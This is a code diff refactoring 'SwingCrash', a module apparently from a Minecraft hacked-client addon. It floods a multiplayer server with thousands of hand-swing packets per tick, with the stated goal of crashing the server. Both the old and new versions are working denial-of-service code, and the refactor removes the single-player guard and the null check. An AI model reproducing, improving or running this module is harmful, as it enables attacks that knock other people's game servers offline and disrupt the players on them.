@@ -13,48 +13,36 @@ import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
 import net.minecraft.util.Hand;
 
 public class SwingCrash extends Module {
-    private final Setting<Integer> amount;
-    private final Setting<Boolean> autoDisable;
+    private final SettingGroup sgGeneral = settings.getDefaultGroup();
 
-    public SwingCrash() {
-        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Swing Crash", "CRYSTAL || Attempts to crash the server by spamming hand swing packets.");
-
-        SettingGroup sgGeneral = this.settings.getDefaultGroup();
-
-        this.amount = sgGeneral.add((new IntSetting.Builder())
+    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
             .name("amount")
             .description("How many packets to send to the server per tick.")
             .defaultValue(2000)
             .min(1)
             .sliderMin(1)
             .sliderMax(10000)
-            .build());
+            .build()
+    );
 
-        this.autoDisable = sgGeneral.add((new BoolSetting.Builder())
+    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
             .name("auto-disable")
             .description("Disables module on kick.")
             .defaultValue(true)
-            .build());
+            .build()
+    );
+
+    public SwingCrash() {
+        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "swing-crash", "CRYSTAL || Attempts to crash the server by spamming hand swing packets.");
     }
 
     @EventHandler
     private void onTick(TickEvent.Post event) {
-        if(!mc.isInSingleplayer()) {
-            for(int i = 0; i < this.amount.get(); ++i) {
-                if (mc.player != null) {
-                    mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
-                }
-            }
-        } else {
-            error("You must be on a server, toggling.");
-            toggle();
-        }
+        for (int i = 0; i < amount.get(); i++) mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
     }
 
     @EventHandler
     private void onGameLeft(GameLeftEvent event) {
-        if (autoDisable.get()) {
-            toggle();
-        }
+        if (autoDisable.get()) toggle();
     }
 }
